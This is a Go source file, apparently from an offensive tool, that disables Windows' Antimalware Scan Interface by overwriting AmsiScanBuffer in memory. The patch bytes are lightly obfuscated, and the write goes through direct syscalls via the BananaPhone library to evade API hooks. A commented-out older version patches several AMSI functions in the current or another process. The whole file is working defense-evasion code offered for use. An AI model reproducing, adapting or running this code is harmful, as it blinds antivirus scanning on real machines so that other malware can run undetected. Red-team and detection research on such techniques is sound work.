package core

/*

References:
https://github.com/Ne0nd0g/merlin-agent/blob/master/os/windows/pkg/evasion/evasion.go
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

*/

import (
  "fmt"
  "unsafe"
  "syscall"

  bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)


var amsi_patch = []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}

func PatchAmsi() (error) {
  err := WriteBanana("amsi.dll", "AmsiScanBuffer", &amsi_patch)
  if err != nil {
    return err
  }

  return nil
}

func WriteBanana(module string, proc string, data *[]byte) error {
  target := syscall.NewLazyDLL(module).NewProc(proc)
  err := target.Find()
  if err != nil {
    return err
  }
  
  banana, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
  if err != nil {
    return err
  }
	
  ZwWriteVirtualMemory, err := banana.GetSysID("ZwWriteVirtualMemory")
	if err != nil {
    return err
  }

  NtProtectVirtualMemory, err := banana.GetSysID("NtProtectVirtualMemory")
  if err != nil {
    return err
  }

  baseAddress := target.Addr()
  numberOfBytesToProtect := uintptr(len(*data))
  var oldProtect uint32

  ret, err := bananaphone.Syscall(
    NtProtectVirtualMemory,
    uintptr(0xffffffffffffffff),
    uintptr(unsafe.Pointer(&baseAddress)),
    uintptr(unsafe.Pointer(&numberOfBytesToProtect)),
    syscall.PAGE_EXECUTE_READWRITE,
    uintptr(unsafe.Pointer(&oldProtect)),
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
  }

  ret, err = bananaphone.Syscall(
    ZwWriteVirtualMemory,
    uintptr(0xffffffffffffffff),
    target.Addr(),
    uintptr(unsafe.Pointer(&[]byte(*data)[0])),
    unsafe.Sizeof(*data),
    0,
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the ZwWriteVirtualMemory syscall with a return of %d: %s", 0, err)
  }

  ret, err = bananaphone.Syscall(
    NtProtectVirtualMemory,
    uintptr(0xffffffffffffffff),
    uintptr(unsafe.Pointer(&baseAddress)),
    uintptr(unsafe.Pointer(&numberOfBytesToProtect)),
    uintptr(oldProtect),
    uintptr(unsafe.Pointer(&oldProtect)),
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
  }
	
  return nil
}

/*func PatchAmsi(pid int) (error) {
  
  amsidll := syscall.NewLazyDLL("amsi.dll") // Load DLLs
  kernel32 := syscall.NewLazyDLL("kernel32.dll")

  amsiScanBuffer := amsidll.NewProc("AmsiScanBuffer")
  amsiScanString := amsidll.NewProc("AmsiScanString")
  amsiInitialize := amsidll.NewProc("AmsiInitialize")
  openProcess := kernel32.NewProc("OpenProcess")
  closeHandle := kernel32.NewProc("CloseHandle")
  getCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
  writeProcessMemory := kernel32.NewProc("WriteProcessMemory")

  time.Sleep(100 * time.Millisecond)

  var handle uintptr
  var err error

  if (pid == 0) {
    handle, _, _ = getCurrentProcess.Call()
  } else {
    handle, _, _ = openProcess.Call(uintptr(0x1F0FFF), uintptr(0), uintptr(pid))
  }

  addresses := []uintptr{
    amsiInitialize.Addr(),
    amsiScanBuffer.Addr(),
    amsiScanString.Addr(),
  }

  var oldProtect uint32
  var old uint32

  time.Sleep(100 * time.Millisecond)

  for _, addr := range addresses {

    _, _, err = virtualProtectEx.Call(uintptr(handle), addr, uintptr(1), windows.PAGE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
    if err != nil {
      fmt.Println("error virtualProtectEx")
    }

    //writeProcessMemory.Call(uintptr(handle), addr, uintptr(unsafe.Pointer(&amsi_patch[0])), uintptr(len(amsi_patch)))
    r1, _, _ := writeProcessMemory.Call(uintptr(handle), addr, uintptr(unsafe.Pointer(&amsi_patch[0])), uintptr(len(amsi_patch)))
    if r1 == 0 {
      fmt.Println("error writeProcessMemory")
    }

    //virtualProtectEx.Call(uintptr(handle), addr, uintptr(1), uintptr(oldProtect), uintptr(unsafe.Pointer(&old)))
    _, _, err = virtualProtectEx.Call(uintptr(handle), addr, uintptr(1), uintptr(oldProtect), uintptr(unsafe.Pointer(&old)))
    if err != nil {
      fmt.Println("error virtualProtectEx")
    }

  }

  closeHandle.Call(handle)
  return nil
}*/


